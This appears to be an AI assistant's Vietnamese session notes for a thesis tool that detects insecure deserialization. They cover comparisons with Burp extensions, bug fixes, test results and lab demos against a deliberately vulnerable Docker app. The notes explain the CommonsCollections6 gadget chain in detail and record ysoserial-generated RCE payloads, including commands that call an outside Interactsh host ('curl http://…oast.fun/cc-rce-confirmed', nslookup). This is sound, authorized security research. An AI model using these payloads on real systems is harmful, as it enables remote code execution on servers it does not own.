README xác nhận: `java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [<gadget_type> [<args>]]`, hỗ trợ đúng 13 "Marshaller": `BlazeDSAMF(0|3|X)`, `Hessian|Burlap`, `Castor`, `Jackson`, `Java`, `JsonIO`, `JYAML`, `Kryo`, `KryoAltStrategy`, `Red5AMF(0|3)`, `SnakeYAML`, `XStream`, `YAMLBeans` — khớp gần như y hệt list module Java của Freddy (xác nhận Freddy build payload dựa theo kỹ thuật marshalsec). Marshalsec CŨNG hỗ trợ "System Command Execution" (`cmd` argument) y hệt cách `ysoserial` nhận lệnh — không chỉ JNDI callback.

**Ý nghĩa cho thesis**: nếu được hỏi "sao không xử lý được Hessian/Kryo/Castor..." — câu trả lời đúng là: kiến trúc hiện tại (`_run_ysoserial()` trong `payloadMutation.py`) chỉ tích hợp `ysoserial` (chỉ phủ `ObjectInputStream` gốc) — muốn mở rộng cần tích hợp THÊM `marshalsec` theo đúng pattern y hệt (gọi subprocess, truyền marshaller+gadget+command) — đây là hướng mở rộng khả thi, cụ thể, không phải "không làm được", chỉ là NGOÀI PHẠM VI hiện tại của thesis.

**[ĐÍNH CHÍNH QUAN TRỌNG] Freddy KHÔNG hẹp hơn tool mình — nó rộng hơn theo 1 trục khác (số thư viện serialize trong CÙNG ngôn ngữ), tool mình chỉ rộng hơn theo trục NGÔN NGỮ. User tự phát hiện ra khi đếm lại số module Freddy.**

Đếm chính xác: Freddy có **20 module Java** (BlazeDS AMF0/AMF3/AMFX, Burlap, Castor, FlexJson, Genson, Hessian, Jackson, JsonIO, JYAML, Kryo+KryoAltStrategy, ObjectInputStream, Red5 AMF0/AMF3, SnakeYAML, XmlDecoder) + **13 module .NET** = **33 thư viện serialize cụ thể**, mỗi cái 1 signature + exploit payload riêng. Grep lại toàn bộ code tool mình — **không có** Hessian/Kryo/Castor/Burlap/BlazeDS/Red5/XmlDecoder/JYAML/Genson/FlexJson/JsonIO ở đâu cả. Tool mình chỉ nhận diện "trông giống Java" qua 1 signature chung (magic bytes `AC ED 00 05`) — tương đương đúng 1 module (`ObjectInputStream`) trong số 20 của Freddy.

**Framing ĐÚNG, PHẢI DÙNG khi trình bày** (không được nói "tool mình bao phủ rộng hơn" chung chung — sai, dễ bị bắt bẻ): rộng/hẹp theo **2 trục riêng biệt**:
- Trục **NGÔN NGỮ/ECOSYSTEM**: tool mình rộng hơn — 7 ecosystem (PHP, Java, Python Pickle, YAML, .NET, Node.js, Ruby) vs Freddy chỉ 2 (Java, .NET).
- Trục **THƯ VIỆN cụ thể trong CÙNG 1 ngôn ngữ**: Freddy SÂU hơn hẳn — 33 thư viện serialize riêng biệt (Hessian/Kryo/Castor/BlazeDS...) vs tool mình gom chung "Java" thành 1 nhánh duy nhất.

**[THAM KHẢO BẢO VỆ LUẬN VĂN — bổ sung, đọc THẬT source code 3 extension, không chỉ docs]** `git clone` thật `nccgroup/freddy`, `federicodotta/Java-Deserialization-Scanner`, `PortSwigger/php-object-injection-check` về đọc — phát hiện chính xác hơn hẳn:

- **Freddy** ([ObjectInputStreamModule.java](https://github.com/nccgroup/freddy/blob/master/src/nb/freddy/modules/java/ObjectInputStreamModule.java)): KHÔNG gọi `ysoserial` lúc chạy — chỉ có **2 payload gadget CỐ ĐỊNH, mã hoá cứng trong source** (CommonsBeanutils qua JNDI/LDAP, XBean qua HTTP), chỉ ghép hostname Collaborator vào 1 offset byte cố định trong payload có sẵn — KHÔNG build lại object graph, KHÔNG chạy được lệnh OS tuỳ ý (chỉ nhét được 1 URL JNDI/HTTP). Confidence 3 mức `CERTAIN/FIRM/TENTATIVE` — **CÓ tự động gán "Certain"** (có tự confirm, ngược triết lý tool mình). Xác nhận qua liệt kê thư mục: Freddy chỉ có đúng `java/` và `dotnet/` — "SnakeYAML" trong đó là thư viện YAML của JAVA, không phải PyYAML Python. Không có `php/`/`python/`/`ruby/`/`node/`.
- **Java Deserialization Scanner**: grep thấy có gọi thật `java -jar ysoserial.jar` (`BurpExtender.java` dòng ~1853-1866) — nhưng nằm trong tab "exploitation" thao tác TAY (user tự nhập path, tự chọn chain, tự bấm) — không phải pipeline tự động.
- **PHP Object Injection Check** (đọc hết 250 dòng `BurpExtender.java`): chỉ 1 kỹ thuật — gửi object `PDO` rỗng lợi dụng `__wakeup()` built-in PHP luôn throw lỗi để DETECT có `unserialize()` hay không — KHÔNG tích hợp `phpggc`, không khai thác gì thêm, không có phân tích format/fingerprint.

**Điểm khác biệt THẬT, cụ thể, nên dùng khi bảo vệ** (mạnh hơn hẳn bản so sánh dựa docs trước đó): tool mình gọi **ysoserial/phpggc/ysonet THẬT lúc chạy, trong pipeline tự động, không cần thao tác tay** (khác JDS); chọn được NHIỀU gadget chain, chạy được **lệnh OS bất kỳ** chứ không chỉ 1 URL JNDI cố định (khác Freddy); **không bao giờ tự "Confirmed"** — triết lý ngược hẳn Freddy (có tự gán Certain).

**[THAM KHẢO BẢO VỆ LUẬN VĂN] So sánh chức năng insecure deserialization: Burp Suite vs tool — giảng viên hỏi, đã tra cứu thật (WebSearch) để trả lời chính xác, không chỉ dựa trí nhớ.**

| Tiêu chí | Burp Suite (native + extension) | Tool |
|---|---|---|
| Phát hiện ban đầu | Native: chỉ cảnh báo passive "Serialized object in HTTP message" — CHỈ báo "có dữ liệu giống serialized", không phân tích thêm | `Fingerprint` (Stage 5): phân loại định dạng cụ thể + score/confidence/risk_level + subtype |
| Phạm vi ngôn ngữ | Qua extension rời rạc, mỗi cái 1-2 ngôn ngữ: **Freddy** (Java+.NET), **Java Deserialization Scanner** (Java), **PHP Object Injection Check** + **PHP Object Injection Slinger** (PHP). **Python Pickle/YAML/Node.js/Ruby Marshal: KHÔNG có extension nào trên BApp Store** (đã tra cứu xác nhận, chỉ có hướng dẫn thủ công) | 1 engine duy nhất: PHP, Java, Python Pickle, YAML, .NET, Node.js, Ruby Marshal |
| Sinh payload khai thác | Tự tay chạy `ysoserial` ngoài Burp rồi dán Repeater, hoặc extension tự gọi 1 phần | Tự động gọi `ysoserial`/`phpggc`/`ysonet` ngay trong pipeline |
| Xác nhận exploit | Freddy: error-based/time-based; Java Deserialization Scanner có "CPU mode" (time-based, có thể gây DoS nếu dùng ẩu) | So sánh baseline/mutated nhiều tín hiệu, phân biệt được echo-thuần vs xử lý thật (xem fix hôm trước) |
| OOB | Freddy dùng Burp Collaborator cho case JSON/XML mù | Dùng Interactsh, tự escalate gadget chain kèm lệnh OOB khi chưa rõ gadget |
| Tự động hoá toàn trình | Phải tự ghép nhiều bước/tool rời rạc | 1 pipeline `scan→analyze→assess` trong 1 lệnh |

**Điểm nhấn khi trình bày**: tất cả extension trên đều mã nguồn mở qua BApp Store, KHÔNG phải Burp tự viết (PortSwigger chỉ host, không bảo trì — tự xác nhận qua forum PortSwigger). Khoảng trống THẬT của Burp không phải "chỉ mạnh Java" (đã có đủ Java/.NET/PHP qua 4 extension riêng biệt) — mà là **hoàn toàn không có tooling tự động nào cho Python Pickle/YAML/Node.js/Ruby Marshal**. Đây là điểm cụ thể, có tra cứu xác nhận, nên dùng khi trình bày thay vì nói chung chung "Burp chỉ mạnh Java". **Không nên nói "tool tốt hơn Burp" chung chung** (Burp là scanner tổng quát, tool này chuyên biệt 1 lớp lỗ hổng, chưa battle-tested bằng) — nên nói tool **tự động hoá sâu hơn và tập trung hơn đúng cho riêng insecure deserialization**, có bằng chứng thực nghiệm (case `ref_tag` vs `session` đã fix) chứng minh cơ chế hạn chế false positive/negative đã được kiểm chứng.

Nguồn tra cứu: [Freddy (NCC Group)](https://www.nccgroup.com/research-blog/freddy-an-extension-for-automatically-identifying-deserialisation-issues-in-java-and-net-applications/), [Freddy BApp Store](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3), [Freddy GitHub](https://github.com/nccgroup/freddy), [Java Deserialization Scanner BApp Store](https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae), [Java Deserialization Scanner GitHub](https://github.com/federicodotta/Java-Deserialization-Scanner), [PHP Object Injection Check BApp Store](https://portswigger.net/bappstore/24dab228311049d89a27a4d721e17ef7) + [GitHub](https://github.com/PortSwigger/php-object-injection-check), [PHP Object Injection Slinger BApp Store](https://portswigger.net/bappstore/631785c4cb4147feb5fdbf272f80f30c).

**[ĐÃ FIX — quan trọng] Fix 2 (strong_signal) trước đó bị quá tay, làm mất 1 finding PHP THẬT SỰ — phát hiện khi review `php-app`, đã sửa lại.**

**Bug phát hiện khi review PHP**: `session` cookie trên `php-app` (`SessionHelper.php:17` gọi `unserialize()` thẳng lên cookie, `dashboard.php` đọc `$user->admin`) là **privilege escalation thật 100%** kiểu PortSwigger kinh điển — flip `b:0`→`b:1` trong cookie là `role` đổi từ `"user"` thành `"admin"`. Nhưng response này KHÔNG đổi status/length, không có error keyword — chỉ có đúng 1 indicator yếu `"content differs in a small way"` — **giống hệt điều kiện của `ref_tag` decoy** mà Fix 2 trước đó coi là yếu. Test trực tiếp: `_compare()` (bản Fix 2 cũ) cho case này ra `strong_signal: False` — **finding thật bị giấu mất**.

**Root cause của Fix 2 cũ**: chỉ phân biệt theo LOẠI indicator (status/length/error = mạnh, content-diff = yếu) — không phân biệt được "server chỉ echo lại đúng y chang cái tôi gửi" (vô hại, case `ref_tag`) với "server tự tính ra 1 giá trị MỚI, khác hẳn cái tôi gửi" (xử lý thật, case `session`/`role`) — cả 2 đều chỉ có 1 content-diff indicator như nhau.

**Fix mới**: [replay_request.py](Replay/replay_request.py) — thêm `_is_mere_reflection(mutated_body, injected_value)`: kiểm tra xem giá trị ĐÃ GỬI LÊN (`injected_value`, lấy qua `_decode_raw_value()` mới tách ra, decode sẵn TRƯỚC khi bọc lại encoding_chain) có nằm sẵn BÊN TRONG response hay không (có xử lý cả trường hợp JSON tự escape dấu `"` thành `\"`). Nếu CÓ → echo thuần, giữ yếu. Nếu KHÔNG → server tự tạo ra nội dung mới → `strong_signal = True`.

**Verify bằng data thật đã lưu (không cần Docker)**:
- PHP (`php_assess_v3.json`): `session`/`flip_boolean` (privesc thật) vẫn `True` ✓; 4 entry `ref_tag` (decoy) đổi đúng từ `True`→`False` ✓.
- Java (`debug_step8.json`) — **bonus fix phát hiện thêm**: 2 entry `raw_body`/`payload` tại `/api/integration/receive` (`"receivedType":"java.lang.String"`→`"java.util.HashMap"`/`"HashSet"` — bằng chứng type-confusion THẬT đã xác nhận từ đầu session) đổi đúng từ `False`→`True` — cũng từng bị Fix 2 cũ giấu mất, giờ khôi phục đúng. Lý do kỹ thuật: payload gửi lên (~700 byte binary) không thể nào là substring của response ngắn (~50 ký tự) dù chữ "HashMap" có nằm trong payload — nên không bị tính nhầm là echo.
- Test suite: **84/84 pass** (thêm 2 test mới: `test_derived_value_not_matching_injected_payload_is_strong_signal`, `test_reflection_check_handles_json_escaped_quotes`).

**[KIẾN THỨC THAM KHẢO — Q&A trong lúc demo RCE lên `java-vuln-app`]** Gom lại các câu hỏi/giải thích kỹ thuật đã trao đổi, dạng tham chiếu để đọc lại sau này.

- **Cơ chế gadget chain `CommonsCollections6` hoạt động cụ thể ra sao** (trích đúng string đọc được từ payload thật đã gửi):
  ```
  java.util.HashSet                    <- lop ngoai cung, trigger tu nhien qua readObject()
    TiedMapEntry                       <- hashCode() cua no tu goi map.get(key)
      LazyMap (factory=...)            <- key chua co -> tu goi factory.transform()
        ChainedTransformer             <- chay noi tiep 4 buoc:
          1. ConstantTransformer -> tra ve class java.lang.Runtime
          2. InvokerTransformer -> goi "getMethod" lay method getRuntime
          3. InvokerTransformer -> goi "invoke" -> THUC THI Runtime.getRuntime()
          4. InvokerTransformer -> goi "exec" voi tham so la lenh he thong
  ```
  Không ai viết dòng `Runtime.getRuntime().exec(cmd)` — đó là DỮ LIỆU (chuỗi Transformer nối nhau), chỉ "chạy" khi `HashSet.readObject()` (code JDK bình thường) tự động gọi `.hashCode()` lên phần tử bên trong nó.

- **Vì sao chuỗi `//////////` xuất hiện trong payload URLDNS base64**: `/` = giá trị 6-bit `111111` (toàn bit 1) → 1 cụm `/` dài = 1 cụm byte `0xFF` liên tiếp trong nhị phân gốc. Giải mã thật: đúng 8 byte `0xFF` liên tiếp ở offset 212, khớp 2 field `int` của class `java.net.URL`: `port=-1` (bình thường, URL không ghi port) và **`hashCode=-1`** (cố ý — đánh dấu "chưa tính", buộc `HashMap.readObject()` phải tự gọi lại `URL.hashCode()` thật, mà hàm đó resolve DNS thật — đây chính là cơ chế OOB của URLDNS).

- **Vì sao RCE thực hiện được mà không cần sửa code gì cả**: lỗ hổng là tính chất CÓ SẴN của code (dependency `commons-collections:3.2.1` + endpoint `ObjectInputStream.readObject()` không giới hạn kiểu + UI công khai gửi payload — cả 3 đều có từ 07/10, xác nhận bằng `git log`/`git diff` rỗng). Việc khai thác chỉ là tạo đúng DỮ LIỆU đầu vào từ phía attacker, không đụng gì tới nạn nhân — giống 1 ổ khóa lỗi từ lúc sản xuất, không cần sửa khóa để mở được nó.

- **OOB = out-of-band** (xác nhận lỗ hổng qua kênh ngoài HTTP response, ở đây là DNS/HTTP callback tới Interactsh) — không phải "out of bound" (lỗi truy cập ngoài vùng nhớ, khác hẳn loại lỗi).

- **`indicators` nằm ở đúng 1 chỗ duy nhất mang nghĩa bảo mật**: [Replay/replay_request.py:176+](Replay/replay_request.py) `_compare()`, chạy ở Stage 8 sau khi có response thật. [Analyze/normalize.py:206-207](Analyze/normalize.py#L206-L207) có biến trùng tên nhưng khác hẳn mục đích (chỉ là list ký tự đặc trưng để tính điểm "giống serialized" ở Stage 4, không liên quan gì tới việc exploit thành công hay không).

- **Vai trò thật của `len(indicators) > 0` (trước khi fix)**: chỉ là 1 cái lọc thô "có khác gì giữa baseline/mutated hay không", KHÔNG phải thước đo mức độ nghiêm trọng — xem mục Fix 2 bên dưới để biết vì sao điều này gây hiểu nhầm và đã được sửa.

**[XÁC NHẬN THẬT — RCE FULL, KHÔNG CHỈ DESERIALIZE] Escalation tool tự sinh (Option B) đã đạt RCE hoàn chỉnh, có bằng chứng OOB độc lập, không cần tôi tự tay craft payload.**

Sau khi chạy `assess` thật (84 mutation `java_rce_escalation`, xem mục dưới), user tự mở web Interactsh kiểm tra — thấy 1 **HTTP interaction mới**, response từ server `oast.fun`, body là trang mặc định Interactsh (`<html>...kzisoa3vpcb6zokprndhiylswmociptq...</html>`). Đây là bằng chứng **mạnh hơn URLDNS**: URLDNS chỉ chứng minh "deserialize có chạy" (qua side-effect gọi `hashCode()`), còn HTTP interaction này chứng minh toàn bộ chuỗi `InvokerTransformer` đã chạy HẾT tới bước cuối — `Runtime.exec("curl http://qtpticomwslyihdnrpkoz6bcpv3aosizk.oast.fun/cc-rce-confirmed")` thật sự được server `java-vuln-app` thực thi, tự nó spawn process `curl` mới và tạo kết nối ra ngoài.

Nguồn gốc chuỗi lệnh `curl` — [payloadMutation.py:202-205](Analyze/payloadMutation.py#L202-L205) (`RCE_ESCALATION_OOB_COMMANDS`), được format với domain OOB rồi truyền cho `ysoserial` ở [payloadMutation.py:217-220](Analyze/payloadMutation.py#L217-L220) — `ysoserial` (không phải code Python) mới là nơi nhúng chuỗi lệnh này vào bên trong object serialized làm tham số cho `InvokerTransformer`. `Replay/replay_request.py` hoàn toàn không biết nội dung bên trong — chỉ coi `payload` là 1 cục byte mù, decode base64 rồi gửi làm giá trị cookie/body.

**Ý nghĩa cho thesis**: đây là ví dụ hoàn chỉnh nhất trong cả session — tool tự: scan → phát hiện field Java "Unknown Gadget" → tự escalate thử gadget chain phổ biến → tự sinh payload RCE thật qua `ysoserial` → tự gửi → có bằng chứng ĐỘC LẬP (OOB, không phụ thuộc server tự báo lỗi) xác nhận RCE thành công hoàn chỉnh. Không có bước nào trong chuỗi này cần tôi tự tay can thiệp (khác hẳn lần demo RCE đầu tiên, phải tự gọi `ysoserial` bằng tay).

**[ĐÃ FIX] 2 fix — (1) tool tự escalate lên gadget-chain RCE dùng OOB command (Option B đã chọn), (2) `likely_vulnerable` không còn bị 1 indicator yếu "kéo" lên True giống bằng chứng mạnh.**

**Fix 1 — escalate tự động, theo đúng Option B đã chốt với user** (giải quyết TODO ở mục dưới):
- Thêm [payloadMutation.py: `_mutate_java_rce_escalation()`](Analyze/payloadMutation.py) — khi `probe == "urldns_probe"` (case "Unknown Gadget", không tìm thấy keyword gadget cụ thể), tự động thử thêm các chain mặc định (`_resolve_chains()` fallback) — nhưng dùng lệnh gọi OOB (`nslookup {domain}`, `curl http://{domain}/cc-rce-confirmed`) thay vì `id`/`whoami`/`hostname` — vì lệnh cũ không có cách nào quan sát được qua response HTTP (đã tự tay chứng minh điều này khi demo RCE thật, phải `docker exec` vào xem file mới biết, response HTTP không nói gì). Dùng domain OOB đã cấu hình sẵn (`get_oob_domain()`), người dùng tự check log Interactsh bằng tay sau đó — không cần xây thêm hạ tầng tự poll API (Option C, để sau nếu cần).
- `mutate()`'s dispatch: `probe == "urldns_probe"` giờ trả về `_mutate_java_urldns() + _mutate_java_rce_escalation()` thay vì chỉ URLDNS đơn lẻ.
- Không đụng tới `_mutate_java()` (nhánh `probe=="ysoserial"`, khi ĐÃ có keyword gadget cụ thể) — giữ nguyên dùng `id`/`whoami`/`hostname` như cũ, vì case đó đã có hint mạnh từ fingerprint, hợp lý theo dùng lệnh chẩn đoán trực tiếp.

**Fix 2 — tách "có indicator" khỏi "đủ mạnh để tính likely_vulnerable"**, đúng vấn đề user chỉ ra: [replay_request.py:62](Replay/replay_request.py#L62) cũ `"likely_vulnerable": len(indicators) > 0` coi MỌI indicator ngang nhau — khiến `ref_tag` (chỉ có 1 indicator yếu "content differs nhẹ") và `session` (có indicator mạnh "error disclosure") đều ra `True` giống nhau, chính là nguyên nhân kỹ thuật khiến tôi đọc nhầm `ref_tag` lúc trước trong session.
- `_compare()` giờ trả về `tuple[list[str], bool]` — `indicators` giữ đầy đủ như cũ (không ẩn gì), `strong_signal` chỉ `True` khi có ít nhất 1 trong: status đổi, length đổi nhiều, error/exception keyword, delay vượt ngưỡng. Riêng "content differs in a small way" (indicator yếu nhất, do echo/reflect đơn thuần cũng ra y hệt) **không** set `strong_signal`.
- `replay()` dùng `strong_signal` cho `likely_vulnerable` thay vì `len(indicators) > 0`.

**Test mới**: `TestCase/test_payload_mutation.py` thêm class `TestJavaRceEscalation` (4 test: không có oob_domain → rỗng; không có jar → rỗng; lệnh escalate phải chứa domain OOB không phải lệnh benign; dispatch phải gọi cả 2 hàm — dùng spy, không phụ thuộc máy có `java` thật hay không). `TestCase/test_replay_request.py` (mới, 7 test) — test trực tiếp `_compare()`: case giống nhau hệt → không indicator; case chỉ content-diff yếu (đúng mô phỏng `ref_tag`) → có indicator nhưng `strong_signal=False`; case status/length/error/time đổi → `strong_signal=True`; case cả yếu+mạnh cùng lúc → vẫn `True`. **82/82 test pass** (71 cũ + 4 + 7 mới).

**Verify live qua Docker — xong, cả 2 fix đúng trên server thật** (rebuild lại image `ethicalquoc`, chạy `scan→analyze→assess` thật qua network `java-vuln-app`):
- `ref_tag`: **0/56 còn `likely_vulnerable: true`** (trước fix là 8) — đúng kỳ vọng.
- Escalation: sinh đúng **84 mutation** `java_rce_escalation` (14 vector Java × 3 chain × 2 lệnh OOB) — **41/84 ra `likely_vulnerable: true`** với indicator thật: `status 200→500` + `length đổi` + `"Error/exception disclosure: ['exception','objectinputstream','invalidclassexception']"` — tool **tự phát hiện** server thật sự chạy `ObjectInputStream.readObject()` giữa chừng khi xử lý CommonsCollections6/CommonsCollections1/Spring1, không cần tôi tự tay craft như lần demo RCE trước đó.
- **Chưa check**: Interactsh có interaction mới từ 84 lệnh `nslookup`/`curl` đó không — đây là bằng chứng RCE thật thành công hoàn toàn (không chỉ "deserialize rồi throw exception giữa chừng"), cần user tự mở web Interactsh xem (không có cách nào tool tự kiểm tra được, đã bàn ở Option C).
- Test suite trong container thật (java/php/ruby real): **82/82 pass**.

**Chưa verify live qua Docker** — Docker đang tắt lúc fix xong. Cần mở lại Docker rồi chạy `main.py scan→analyze→assess` thật qua `java-vuln-app` để xác nhận: (a) `ref_tag` không còn `likely_vulnerable: true` nữa; (b) `session`/`raw_body` sinh thêm mutation `type="java_rce_escalation"` dùng lệnh OOB; (c) kiểm tra log Interactsh có interaction mới từ các lệnh `nslookup`/`curl` đó không.

**[TODO — CẦN FIX, CHƯA LÀM] Tool chỉ gợi ý bằng text, KHÔNG tự escalate lên full gadget-chain RCE sau khi URLDNS đã confirm deserialize thật.**

**Phát hiện khi nào**: demo RCE thật lên `java-vuln-app` (`/api/integration/receive`, payload `CommonsCollections6` tự sinh bằng `ysoserial-all.jar`, lệnh `touch /tmp/pwned_by_ethicalquoc`) — gửi qua `curl`/UI `dashboard.html` (ô "Partner integration sync") → vào `docker exec` kiểm tra, file thật được tạo, `id` cho thấy chạy bằng `root`. **RCE xác nhận thật 100%**, không phải suy đoán.

**Nhưng RCE này KHÔNG phải do pipeline tool tự sinh ra** — tôi phải gọi tay `java -jar ysoserial-all.jar CommonsCollections6 ...` trực tiếp, bypass hẳn `PayloadMutation`. Lý do, lần theo đúng code:
- [ExploitabilityAnalysis.py:255-291](Analyze/ExploitabilityAnalysis.py#L255-L291) `_analyze_java()`: nếu giá trị quan sát được KHÔNG chứa keyword gadget nào (`commonscollections`, `spring`...) — đúng case thật của `session`/`raw_body` trong HAR (chỉ chứa `UserSession`/`"hello"`) — rơi vào fallback `exploit_type = "Java Deserialization — Unknown Gadget"`, `probe = "urldns_probe"`.
- [payloadMutation.py:51-56](Analyze/payloadMutation.py#L51-L56) `mutate()`: chỉ gọi `_mutate_java()` (hàm sinh CommonsCollections6/Spring1 — chỗ **thật sự RCE**) khi `self.probe == "ysoserial"`. Với `probe="urldns_probe"`, code chỉ đi nhánh `_mutate_java_urldns()` — dừng ở mức "xác nhận có deserialize", không bao giờ thử tiếp gadget chain RCE.
- Tool CÓ gợi ý bước tiếp theo bằng text (`notes: "...Then try common chains: CommonsCollections, Spring, Groovy"`) nhưng không tự làm — người dùng phải tự đọc note rồi tự tay chạy ysoserial như tôi vừa làm.

**Hướng fix đã bàn (chưa code)**: sau khi `urldns_probe` được REPLAY xác nhận thật (có observation/indicator kiểu OOB callback hoặc exception confirm), tự động escalate — gọi thêm `_mutate_java()` brute-force CommonsCollections/Spring/Groovy, không chỉ dừng ở gợi ý text. Cần quyết định: escalate ngay ở Stage 7 (trước khi biết replay có confirm hay không — tốn thời gian/tool calls vô ích nếu urldns không confirm được) hay escalate ở Stage 8/assess (sau khi đã thấy OOB confirm thật — chỉ tốn công khi ĐÃ chắc có deserialize) — hướng 2 hợp lý hơn nhưng cần thêm 1 vòng mutate+replay nữa sau assess, hiện kiến trúc pipeline chưa có vòng lặp kiểu này (`assess` hiện tại 1 chiều: mutate hết ở Stage 7 rồi mới replay 1 lần ở Stage 8).

**[XÁC NHẬN VỚI USER] `cookie/ref_tag` là decoy CÓ CHỦ Ý (không phải bug/thiếu sót) — user tự xác nhận: "tôi cố tình để giả lập noise ở case thực tế".** Bổ sung cho mục đính chính `ref_tag` ở dưới — không cần sửa gì ở `PortalApiController.java`, giữ nguyên để làm ví dụ false-positive trong thesis.

**Phân tích thêm (trả lời "nếu có code chạm tới ref_tag thì sao")**: có 2 case rất khác nhau, nên phân biệt rõ khi viết thesis —
1. **Chạm tới nhưng xử lý vô hại** (VD thật `unserialize()` object `Tag` — chỉ 1 field `name`, không magic method/gadget keyword nào): output quan sát được TỪ NGOÀI sẽ **giống hệt** case hiện tại (chỉ echo lại giá trị, không exception, không OOB) — **không thể phân biệt bằng black-box testing** giữa "unserialize() thật nhưng vô hại" và "chỉ reflect chuỗi thô". Đây là hạn chế thật của phương pháp, không phải lỗi tool.
2. **Chạm tới bằng payload có gadget chain thật**: [ExploitabilityAnalysis.py:143-150](Analyze/ExploitabilityAnalysis.py#L143-L150) — nếu value match `PHP_GADGET_CHAINS`/`PHP_MAGIC_METHODS` (Monolog/Laravel/`__wakeup`...) thì probe đổi thành `"gadget_chain"`/`"magic_method"` → [payloadMutation.py:381-405](Analyze/payloadMutation.py#L381-L405) gọi **phpggc thật** sinh RCE payload — nếu server thật có unserialize() + đúng lib cài sẵn, sẽ có bằng chứng mạnh (RCE/OOB/exception), giống kiểu bằng chứng của `session` cookie. `ref_tag` hiện tại chỉ match `PHP_IDENTITY_FIELDS` (`"name"`) nên luôn đi nhánh `"modify_string"` nhẹ, không bao giờ gọi phpggc.
→ Kết luận cho thesis: field có cấu trúc đơn giản (không gadget/magic method) thì DÙ unserialize() thật hay giả, bằng chứng quan sát được vẫn yếu/mơ hồ như nhau — chỉ gadget chain thật mới tạo ra tín hiệu phân biệt được.

**[GIẢI THÍCH] `request_context` trong file output (`debug_step8.json`, `analyze.json`...) luôn là bản GỐC, CHƯA mutate — không phải request đã gửi thật lúc replay.** Trace code:
- Tạo 1 lần duy nhất ở Stage 1, [har_loader.py:37-42](Scanner/har_loader.py#L37-L42) `_build_request_context(req)` — chụp đúng request thật từ HAR.
- Đi xuyên các stage sau mà không đổi (`cleanfilter`, `normalize`, [payloadMutation.py:144](Analyze/payloadMutation.py#L144) `_make_payload()` chỉ copy lại).
- Lúc replay, [replay_request.py:106-126](Replay/replay_request.py#L106-L126): `headers`/`cookies` là **bản copy MỚI** tạo ngay trong `_send()`, mutation (`cookies[name]=value`/`headers[name]=value`) sửa trên bản copy này, **không đụng tới `request_context` gốc**. Request đã-mutate thật KHÔNG được lưu lại vào output JSON ở đâu cả (chỉ lưu `baseline`/`mutated` là kết quả response).
- Muốn biết chính xác request đã gửi: tự tái tạo bằng tay — lấy `request_context.cookies`/`headers`, thay field tên `mutation.name` bằng giá trị decode từ `mutation.payload` (base64 → áp `encoding_chain`) — đúng cách đã demo bằng `curl` lên `/api/profile` trước đó.

**[REVIEW TỔNG — "chốt cuối"] Rà soát sâu toàn bộ pipeline (đọc lại hết các file Analyze/*, main.py, chạy thật end-to-end qua Docker, đối chiếu ngược source code thật của java-vuln-app) — 1 đính chính quan trọng + 2 fix đã làm.**

**🔴 Đính chính: `cookie/ref_tag` KHÔNG phải bằng chứng insecure deserialization — đã xác nhận với user là decoy CÓ CHỦ Ý.** Đọc trực tiếp [java-app/.../PortalApiController.java:55-67](D:\Thesis\Web%20vul%20env\java-app\src\main\java\com\webvulenv\javaapp\controller\PortalApiController.java#L55-L67): `ref_tag` chỉ được `readCookie()` + `urlDecode()` rồi echo thẳng ra JSON (`result.put("referral_tag", refTag)`) — **không hề qua `unserialize()`/`ObjectInputStream`**. `grep -rn "ref_tag"` toàn bộ 2 app (Java+PHP) xác nhận chỉ xuất hiện đúng 1 chỗ này. Trước đó trong session (bao gồm 1 lần tôi tự demo bằng curl) đã nhầm trình bày việc server echo lại payload là "bằng chứng unserialize không an toàn" — **sai**, đó chỉ là reflect chuỗi thô. User xác nhận: đây là decoy có chủ đích (test xem tool có false-positive với "giống serialized nhưng không bị xử lý" không) — **không dùng case này làm ví dụ deserialization thật trong thesis**. 2 case THẬT sự có deserialize, đã verify bằng source code:
- `cookie/session` → [SessionCookieFilter.java:52-54](D:\Thesis\Web%20vul%20env\java-app\src\main\java\com\webvulenv\javaapp\filter\SessionCookieFilter.java#L52-L54): `ObjectInputStream.readObject()` + cast `UserSession` thật — có cả `ClassCastException` + OOB DNS callback làm bằng chứng độc lập.
- `raw_body` tại `/api/integration/receive` → [MessageIntegrationController.java:34-35](D:\Thesis\Web%20vul%20env\java-app\src\main\java\com\webvulenv\javaapp\controller\MessageIntegrationController.java#L34-L35): cũng `ObjectInputStream.readObject()` thật.

**🟠 Fix: gộp logic Stage 4-7 (`main.py` lệch kiến trúc với `debug_pipeline.py`).** Trước đây `main.py`'s lệnh `analyze` lặp **từng candidate** của `DataNormalizer.normalize()`, gọi `Fingerprint([candidate])` riêng lẻ (N entry/N candidate); `debug_pipeline.py` gọi `Fingerprint(value_normalize)` 1 lần trên cả list rồi mutate bằng `value_normalize[0]` — 2 đường lệch nhau, dù hiện tại CHƯA lộ ra sai khác (dataset test chưa có vector nào `normalize()` trả về >1 candidate thật, đã check `--step 4`: 0/29). Sửa theo đúng pattern đã có sẵn cho Stage 8 (`debug_pipeline.py` import `_apply_replay_confirmation` từ `main.py`, không viết lại logic riêng):
- Thêm hàm `_analyze_one(vector) -> dict` trong [main.py:40-66](D:\Thesis\Thesis\main.py#L40-L66), gộp đúng normalize→fingerprint(cả list)→exploit→mutate(candidate đầu).
- `main.py`'s lệnh `analyze` ([main.py:165-171](D:\Thesis\Thesis\main.py#L165-L171)) gọi hàm này thay vòng lặp cũ.
- `debug_pipeline.py` ([debug_pipeline.py:113-118](D:\Thesis\Thesis\debug_pipeline.py#L113-L118)): khi `--step >= 7`, `from main import _analyze_one` thay vì tính lại — step 4/5/6 (xem dở, tránh trả giá gọi `PayloadMutation`/`ysoserial` khi chưa cần) vẫn giữ logic riêng như cũ.
- Verify: diff từng entry (url/method/location/name/payload/likely_vulnerable/skipped) giữa Stage 8 output trước và sau refactor — **giống tuyệt đối 56/56**; `main.py analyze` trước/sau cũng 29/29 giống nhau.

**🟡 Fix: thêm test regression cho đúng bug Cookie-header đã fix trước đó.** Thêm [TestCase/test_har_loader.py](TestCase/test_har_loader.py) (trước đây `har_loader.py`/`postfiltered.py`/`cleanfilter.py`/`replay_request.py` không có test nào). 3 nhóm test: (1) `cookies[]` đầy đủ + Cookie header composite 4 cookie giống HAR thật → phải 0 vector `header/Cookie`, đủ 4 vector `cookie/*`; (2) `cookies[]` rỗng → vector `header/Cookie` phải CÒN (lưới an toàn); (3) `request_context.headers.Cookie` vẫn phải được giữ nguyên trong mọi vector bất kể có bị skip làm vector riêng hay không. Full suite: **71/71 pass** (64 cũ + 7 mới).

